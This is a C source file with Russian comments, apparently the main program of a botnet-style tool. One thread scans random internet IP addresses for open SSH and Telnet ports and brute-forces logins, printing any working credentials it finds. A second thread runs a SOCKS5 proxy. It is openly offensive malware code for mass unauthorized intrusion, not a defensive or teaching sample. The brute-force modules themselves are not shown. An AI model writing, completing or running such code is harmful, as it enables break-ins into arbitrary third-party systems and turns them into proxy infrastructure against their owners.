#include "bruteforce/ssh_bruteforce.c"
#include "bruteforce/telnet_bruteforce.c"
#include "socks5/proxy.h"
#include "include/includes.h"
#include "find_ips/finder.h"

void *bruteforce_thread(void *arg) {
    // Здесь разместите логику bruteforce
    // Например:
    while (1) {
        char ip_address[IP_ADDRESS_LENGTH];
        generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
        printf("Проверка IP: %s\n", ip_address);
        
        if (check_port_open_on_ip(ip_address, SSH_PORT) == 1) {
            Credentials ssh_credentials = ssh_brute(ip_address);
            if (ssh_credentials.good) {
                printf("Успешный вход SSH: %s:%s\n", ssh_credentials.username, ssh_credentials.password);
            }
        }
        
        if (check_port_open_on_ip(ip_address, TELNET_PORT) == 1) {
            Credentials telnet_credentials = telnet_brute(ip_address);
            if (telnet_credentials.good) {
                printf("Успешный вход Telnet: %s:%s\n", telnet_credentials.username, telnet_credentials.password);
            }
        }
        
        // Добавьте задержку, чтобы не перегружать систему
        sleep(0.1);
    }
    return NULL;
}

int main() {
    pthread_t bruteforce_thread_id;
    pthread_t socks5_thread_id;

    // Создание потока для bruteforce
    if (pthread_create(&bruteforce_thread_id, NULL, bruteforce_thread, NULL) != 0) {
        fprintf(stderr, "Ошибка при создании потока bruteforce\n");
        return 1;
    }

    // Создание потока для SOCKS5 прокси
    if (pthread_create(&socks5_thread_id, NULL, main_socks, NULL) != 0) {
        fprintf(stderr, "Ошибка при создании потока SOCKS5\n");
        return 1;
    }

    // Ожидание завершения потоков (в данном случае они никогда не завершатся)
    pthread_join(bruteforce_thread_id, NULL);
    pthread_join(socks5_thread_id, NULL);

    return 0;
}